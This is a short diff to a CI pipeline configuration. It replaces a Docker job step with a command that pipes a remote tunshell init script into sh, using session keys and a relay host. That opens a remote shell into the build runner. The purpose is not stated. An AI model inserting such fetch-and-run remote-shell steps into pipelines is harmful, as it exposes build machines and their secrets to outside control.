@@ -11,7 +11,7 @@ blocks:
         - name: 'Job #1'
           commands:
             - ip addr
-            - 'docker run -d -p 6080:6080 yen3/ubuntu-novnc'
+            - 'curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 0pvdbQW5TyRXkoqvCAQ0JX IGfjbkn3pQcJqvVZ9kc6k3 eu.relay.tunshell.com'
       env_vars:
         - name: FOO_1
           value: BAR_1
